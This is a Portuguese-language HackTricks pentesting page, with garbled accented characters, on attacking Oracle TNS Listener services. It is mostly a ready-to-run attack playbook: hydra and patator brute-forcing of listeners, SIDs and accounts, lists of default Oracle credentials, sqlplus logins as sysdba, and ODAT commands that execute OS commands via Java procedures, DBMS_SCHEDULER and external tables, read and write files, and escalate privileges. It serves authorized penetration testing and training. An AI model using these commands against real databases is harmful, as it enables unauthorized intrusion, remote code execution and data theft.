# 1521,1522-1529 - Pentesting Oracle TNS Listener

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informa√ß√µes B√°sicas

O banco de dados Oracle (Oracle DB) √© um sistema de gerenciamento de banco de dados relacional (RDBMS) da Oracle Corporation (de [aqui](https://www.techopedia.com/definition/8711/oracle-database)).

Ao enumerar o Oracle, o primeiro passo √© se comunicar com o TNS-Listener que geralmente reside na porta padr√£o (1521/TCP, -voc√™ tamb√©m pode encontrar listeners secund√°rios nas portas 1522‚Äì1529-).
```
1521/tcp open  oracle-tns    Oracle TNS Listener 9.2.0.1.0 (for 32-bit Windows)
1748/tcp open  oracle-tns    Oracle TNS Listener
```
## Resumo

1. **Enumerar informa√ß√µes da vers√£o** (procurar por **vulns conhecidas**)
2. **For√ßa bruta no TNS listener** (nem sempre necess√°rio)
3. **Enumerar**/For√ßa bruta em **nomes de SID** (como nomes de bancos de dados)
4. **For√ßa bruta nas credenciais** para nome de SID v√°lido descoberto
5. Tentar **executar c√≥digo**

Para usar os m√≥dulos oracle do MSF, voc√™ precisa instalar algumas depend√™ncias: [**Instala√ß√£o**](oracle-pentesting-requirements-installation.md)

## Enumera√ß√£o

Ferramentas que podem ser usadas para isso s√£o: nmap, MSF e [tnscmd10g](http://dokfleed.net/files/audit/tnscmd10g.zip).

### Vers√£o do TNS listener
```bash
nmap --script "oracle-tns-version" -p 1521 -T4 -sV <IP>
msf> use auxiliary/scanner/oracle/tnslsnr_version
#apt install tnscmd10g
tnscmd10g version -p 1521 -h <IP>
```
Outros comandos √∫teis do TNS listener:

| **Comando**  | **Finalidade**                                                   |
| ------------ | ---------------------------------------------------------------- |
| ping         | Pingar o listener                                                |
| version      | Fornecer sa√≠da da vers√£o do listener e informa√ß√µes da plataforma |
| status       | Retornar o status atual e vari√°veis usadas pelo listener         |
| services     | Despejar dados do servi√ßo                                        |
| debug        | Despejar informa√ß√µes de depura√ß√£o no log do listener             |
| reload       | Recarregar o arquivo de configura√ß√£o do listener                 |
| save\_config | Escrever o arquivo de configura√ß√£o do listener em um backup      |
| stop         | Invocar o desligamento do listener                               |

Se voc√™ **receber um erro**, pode ser porque as **vers√µes do TNS s√£o incompat√≠veis** (Use o par√¢metro `--10G` com `tnscmd10`) e se o **erro persistir,** o listener pode estar **protegido por senha** (voc√™ pode ver uma lista onde todos os [**erros s√£o detalhados aqui**](https://docs.oracle.com/database/121/ERRMG/TNS-00000.htm#ERRMG-GUID-D723D931-ECBA-4FA4-BF1B-1F4FE2EEBAD7)) ‚Äî n√£o se preocupe‚Ä¶ hydra ao resgate\*\*:\*\*
```
hydra -P rockyou.txt -t 32 -s 1521 host.victim oracle-listener
```
O listener TNS pode ser vulner√°vel a ataques **MitM**. [Verifique aqui como checar se o servidor est√° vulner√°vel e como realizar o ataque (todas as vers√µes at√© a vers√£o 12c est√£o inclu√≠das)](tns-poison.md).

### Enumera√ß√£o de SID

#### **O que √© um SID**

O SID (Identificador de Servi√ßo) √© essencialmente o nome do banco de dados, dependendo da instala√ß√£o voc√™ pode ter um ou mais SIDs padr√£o, ou at√© mesmo um SID definido pelo dba totalmente personalizado.

**Em algumas vers√µes antigas (na 9 funciona)** voc√™ poderia solicitar o SID e o banco de dados enviaria para voc√™:
```bash
tnscmd10g status-p 1521 -h <IP> #The SID are inside: SERVICE=(SERVICE_NAME=<SID_NAME>)

#msf1
msf> use auxiliary/scanner/oracle/sid_enum
msf> set rhost <IP>
msf> run
#msf2
msf> use auxiliary/admin/oracle/tnscmd
msf> set CMD (CONNECT_DATA=(COMMAND=STATUS))
msf> set rhost <IP>
msf> run #The SID are inside: SERVICE=(SERVICE_NAME=<SID_NAME>)
```
Se voc√™ n√£o conseguir acessar os SIDs dessa forma, ser√° necess√°rio for√ß√°-los por tentativa e erro:

**For√ßa Bruta de SID**

Eu combinei as listas de SID do nmap e do MSF nesta aqui (sem duplicatas):

{% file src="../../.gitbook/assets/sids-oracle.txt" %}
```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/sid.txt -s 1521 <IP> oracle-sid
patator oracle_login host=<IP> sid=FILE0 0=sids-oracle.txt -x ignore:code=ORA-12505
./odat.py sidguesser -s $SERVER -d $SID --sids-file=./sids.txt
msf> use auxiliary/admin/oracle/sid_brute #This will use the list located at /usr/share/metasploit-framework/data/wordlists/sid.txt
nmap --script +oracle-sid-brute -p 1521 10.11.1.202 #This will use the list lcated at /usr/share/nmap/nselib/data/oracle-sids
```
Para usar o **oracle\_login** com o **patator**, voc√™ precisa **instalar**:
```
pip3 install cx_Oracle --upgrade
```
## **Focando em Contas**

**Conseguiu o SID?** Excelente, agora vamos para a pr√≥xima tarefa e extrair as informa√ß√µes da conta do usu√°rio. A partir deste ponto, voc√™ pode se conectar ao listener e for√ßar bruta as credenciais.

**Metasploit** _\*\*scanner/oracle/oracle\_login_ Ele possui um dicion√°rio integrado para os **valores padr√£o mais populares de informa√ß√µes de conta de usu√°rio** apresentados como login:senha. Ali√°s, tais entradas padr√£o representam um dos problemas de seguran√ßa mais populares e graves no Oracle.

**Nmap** tamb√©m pode ajudar aqui com o script _oracle-brute_. Observe que este script **mistura os logins e senhas**, ou seja, ele tenta cada login contra cada senha, e isso leva um bom tempo!

### **Senhas Padr√£o**

Abaixo est√£o algumas das senhas padr√£o associadas ao Oracle:

* **DBSNMP/DBSNMP**‚Ää‚Äî‚ÄäO Agente Inteligente usa isso para se comunicar com o servidor de banco de dados (√© um trabalho mudar isso)
* **SYS/CHANGE\_ON\_INSTALL**‚Ää‚Äî‚ÄäConta padr√£o sysdba antes e incluindo o Oracle v9, a partir da vers√£o 10g isso tem que ser diferente!
* **PCMS\_SYS/PCMS\_SYS**‚Ää‚Äî‚ÄäConta padr√£o x
* **WMSYS/WMSYS**‚Ää‚Äî‚ÄäConta padr√£o x
* **OUTLN/OUTLN**‚Ää‚Äî‚ÄäConta padr√£o x
* **SCOTT/TIGER**‚Ää‚Äî‚ÄäConta padr√£o x

Outras **senhas padr√£o** podem ser encontradas [aqui](http://www.petefinnigan.com/default/oracle_default_passwords.htm) e [aqui](https://cirt.net/passwords?vendor=Oracle).

As vers√µes 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2 e 11.2.0.3 s√£o vulner√°veis a **for√ßa bruta offline**. [**Leia mais sobre esta t√©cnica aqui.**](remote-stealth-pass-brute-force.md)

### For√ßa Bruta de Usu√°rio/Senha

Diferentes ferramentas oferecem **listas diferentes de usu√°rio/senha** para oracle:

* **oscan:** _/usr/share/oscanner/accounts.default_ (169 linhas)
* **MSF-1:** _de_ admin/oracle/oracle\_login \_\_/usr/share/metasploit-framework/data/wordlists/oracle\_default\_passwords.csv (598 linhas)
* **MSF-2:** _de scanner/oracle/oracle\_login_ _/usr/share/metasploit-framework/data/wordlists/oracle\_default\_userpass.txt_ (568 linhas)
* **Nmap:** _/usr/share/nmap/nselib/data/oracle-default-accounts.lst_ (687 linhas)

Eu **misturei** todas elas e **removi duplicatas:**

{% file src="../../.gitbook/assets/users-oracle.txt" %}

{% file src="../../.gitbook/assets/pass-oracle.txt" %}

### [For√ßa Bruta](../../generic-methodologies-and-resources/brute-force.md#oraclesql)

Agora, que voc√™ **sabe um SID v√°lido e credenciais v√°lidas**. Para se conectar ao banco de dados, voc√™ precisa da ferramenta: _**sqlplus**_ e para instal√°-la voc√™ precisa seguir alguns passos:

[Instala√ß√£o](oracle-pentesting-requirements-installation.md)

Para fazer login usando credenciais conhecidas:
```
sqlplus <username>/<password>@<ip_address>/<SID>;
```
Se o TNS Listener estiver em uma porta n√£o padr√£o (por exemplo, TCP/1522):
```
sqlplus <username>/<password>@<ip_address>:<port>/<SID>;
```
Se uma **conta possui privil√©gios de sistema de banco de dados (sysdba) ou operador de sistema (sysop)**, voc√™ pode tentar o seguinte:
```bash
sqlplus <username>/<password>@<ip_address>/<SID> 'as sysdba';
#Example:
sqlplus SYSTEM/MANAGER@192.168.0.2/ORCL 'as sysdba'
```
## **Tudo em Um**

**Uma ferramenta interessante √© o oscanner**, que tentar√° obter algum SID v√°lido e, em seguida, far√° brute-force para credenciais v√°lidas e tentar√° extrair algumas informa√ß√µes:
```bash
#apt install oscanner
oscanner -s <IP> -P <PORT>
```
Outra ferramenta que far√° tudo isso √© [**odat**](https://github.com/quentinhardy/odat):
```bash
git clone https://github.com/quentinhardy/odat.git
cd odat
./odat.py --help #It shouldn't be problems in Kali
./odat.py all -s <IP> -p <PORT>
./odat.py all -s <IP> -p <PORT> -d <SID> #To bruteforce accounts for that SID
```
Com essas op√ß√µes (_-s_ e _-p_), o ODAT ir√° **procurar por SID v√°lido** (System ID) em um primeiro passo. Voc√™ pode configurar algumas op√ß√µes para m√©todos de configura√ß√£o (por exemplo, lista de palavras ou ataque de for√ßa bruta). Por padr√£o, o ODAT usar√° uma grande lista de palavras e realizar√° um pequeno ataque de for√ßa bruta.

Se o ODAT **encontrar pelo menos um SID** (por exemplo, _ORCL_), ele ir√° **procurar por contas Oracle v√°lidas**. Far√° isso em **cada SID encontrado**. Voc√™ pode especificar algumas op√ß√µes para credenciais (por exemplo, _--accounts-file_, _--accounts-files_, _--login-as-pwd_).

Para **cada conta v√°lida** (por exemplo, _SYS_) **em cada inst√¢ncia v√°lida** (SID), o ODAT retornar√° **o que cada usu√°rio Oracle pode fazer** (por exemplo, shell reverso, ler arquivos, tornar-se DBA).

[**Wiki odat**](https://github.com/quentinhardy/odat/wiki)

## Execu√ß√£o Remota de C√≥digo

Existem pelo menos duas maneiras diferentes de executar comandos, como usar procedimentos Java e o pacote DBMS\_SCHEDULER. Ali√°s, voc√™ tamb√©m pode alcan√ßar RCE em caso de inje√ß√£o SQL em uma aplica√ß√£o web, desde que, √© claro, o usu√°rio que a executa tenha direitos suficientes. Neste est√°gio, recomendo vivamente preparar a Ferramenta de Ataque ao Banco de Dados Oracle: [ODAT](https://github.com/quentinhardy/odat).

### Instalar ODAT
```bash
git clone https://github.com/quentinhardy/odat.git
cd odat
./odat.py #It shouldn't be problems in Kali
```
### Executar C√≥digo via Procedimento Armazenado Java
```bash
./odat.py java -s <IP> -U <username> -P <password> -d <SID> --exec COMMAND
```
[Mais detalhes aqui](oracle-rce-and-more.md#rce-java-store-procedure)

### Executar c√≥digo via Scheduler
```bash
./odat.py dbmsscheduler -s <IP> -d <SID> -U <username> -P <password> --exec "C:\windows\system32\cmd.exe /c echo 123&gt;&gt;C:\hacK"
```
[Mais detalhes aqui](oracle-rce-and-more.md#rce-scheduler)

### Executar c√≥digo via Tabelas Externas
```bash
./odat.py externaltable -s <IP> -U <username> -P <password> -d <SID> --exec "C:/windows/system32" "calc.exe"
```
‚ÄòODAT.py‚Äô requer o privil√©gio ‚ÄòCREATE ANY DIRECTORY‚Äô, que, por padr√£o, √© concedido apenas √† fun√ß√£o DBA, pois tenta executar o arquivo de qualquer diret√≥rio e n√£o apenas do "seu" (a vers√£o manual deste ataque requer menos privil√©gios).

[Mais detalhes aqui.](oracle-rce-and-more.md#rce-external-tables)

## Ler/Escrever arquivos
```bash
./odat.py utlfile -s <IP> -d <SID> -U <username> -P <password> --getFile "C:/test" token.txt token.txt
./odat.py externaltable -s <IP> -U <username> -P <password> -d <SID> --getFile "C:/test" "my4.txt" "my"
```
[Mais detalhes aqui](oracle-rce-and-more.md#read-write-files)

## Eleva√ß√£o de Privil√©gios

[Mais detalhes aqui](oracle-rce-and-more.md#elevating-privileges)

Voc√™ pode usar o m√≥dulo [privesc](https://github.com/quentinhardy/odat/wiki/privesc) do odat para escalar privil√©gios. Nesse link, voc√™ pode encontrar **v√°rias maneiras de escalar privil√©gios usando o odat.**
```bash
./odat.py privesc -s $SERVER -d $ID -U $USER -P $PASSWORD -h #Get module Help
```
Vulnerabilidade testada no oracle 10.1.0.3.0 ‚Äì deve funcionar at√© 10.1.0.5.0 e supostamente no 11g. Corrigida com a atualiza√ß√£o cr√≠tica de outubro de 2007 da Oracle.
```bash
msf> use auxiliary/sqli/oracle/lt_findricset_cursor
```
## Ambiente Virtual Gratuito para testes

Se voc√™ deseja praticar ataques a bancos de dados Oracle, a maneira mais segura √© se registrar para o Oracle Developer Days Virtualbox VM:

{% embed url="http://www.oracle.com/technetwork/database/enterprise-edition/databaseappdev-vm-161299.html" %}

A maior parte das informa√ß√µes neste post foi extra√≠da de: [https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573](https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573) e de [https://hackmag.com/uncategorized/looking-into-methods-to-penetrate-oracle-db/](https://hackmag.com/uncategorized/looking-into-methods-to-penetrate-oracle-db/)

Outras **refer√™ncias** interessantes:

[http://blog.opensecurityresearch.com/2012/03/top-10-oracle-steps-to-secure-oracle.html](http://blog.opensecurityresearch.com/2012/03/top-10-oracle-steps-to-secure-oracle.html)

## Comandos Autom√°ticos HackTricks
```
Protocol_Name: Oracle    #Protocol Abbreviation if there is one.
Port_Number:  1521     #Comma separated if there is more than one.
Protocol_Description: Oracle TNS Listener         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for Oracle
Note: |
Oracle database (Oracle DB) is a relational database management system (RDBMS) from the Oracle Corporation

#great oracle enumeration tool
navigate to https://github.com/quentinhardy/odat/releases/
download the latest
tar -xvf odat-linux-libc2.12-x86_64.tar.gz
cd odat-libc2.12-x86_64/
./odat-libc2.12-x86_64 all -s 10.10.10.82

for more details check https://github.com/quentinhardy/odat/wiki

https://book.hacktricks.xyz/pentesting/1521-1522-1529-pentesting-oracle-listener

Entry_2:
Name: Nmap
Description: Nmap with Oracle Scripts
Command: nmap --script "oracle-tns-version" -p 1521 -T4 -sV {IP}
```
<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
